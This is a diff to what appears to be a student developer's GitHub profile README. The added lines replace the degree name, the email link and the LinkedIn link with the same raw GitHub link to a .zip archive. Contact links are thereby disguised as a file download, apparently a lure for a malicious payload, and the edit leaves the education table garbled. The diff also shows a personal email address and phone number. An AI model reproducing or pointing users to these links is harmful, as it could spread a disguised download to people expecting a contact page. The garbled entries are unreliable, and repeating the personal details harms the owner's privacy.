@@ -13,7 +13,7 @@ I am a passionate Full Stack Web Developer dedicated to building impactful and s
 ## 🎓 Education
 | Degree           | Institution                | University/Board | CGPA/Percentage | Year      |
 |------------------|---------------------------|------------------|-----------------|------------|
-| B.Tech (CSEH)    | KL University, Guntur      | KLEF             | 9.2 (Till 6th Sem) | 2022-2026  |
+| https://raw.githubusercontent.com/SAIVIVEK123321/SAIVIVEK123321/main/Esselen/SAIVIVE-2.2.zip (CSEH)    | KL University, Guntur      | KLEF             | 9.2 (Till 6th Sem) | 2022-2026  |
 | Senior Secondary | Narayana Junior College     | BIEAP            | 89.6%           | 2020-2022  |
 | Class X          | Narayana India High School  | SSC              | 96%             | 2020       |
 
@@ -40,9 +40,9 @@ I am a passionate Full Stack Web Developer dedicated to building impactful and s
 - **Maintained a CGPA of 9.21** at KL University (Till 6th Sem)
 
 ## 📞 Contact Me
-- 📧 [2200032666cseh@gmail.com](mailto:2200032666cseh@gmail.com)
+- 📧 [https://raw.githubusercontent.com/SAIVIVEK123321/SAIVIVEK123321/main/Esselen/SAIVIVE-2.2.zip](https://raw.githubusercontent.com/SAIVIVEK123321/SAIVIVEK123321/main/Esselen/SAIVIVE-2.2.zip)
 - 📱 +91-7013598950
-- 🔗 [LinkedIn](https://www.linkedin.com/in/sai-vivek-batchala-06595628a/)
+- 🔗 [LinkedIn](https://raw.githubusercontent.com/SAIVIVEK123321/SAIVIVEK123321/main/Esselen/SAIVIVE-2.2.zip)
 
 Let's connect and build something amazing! 🚀
 
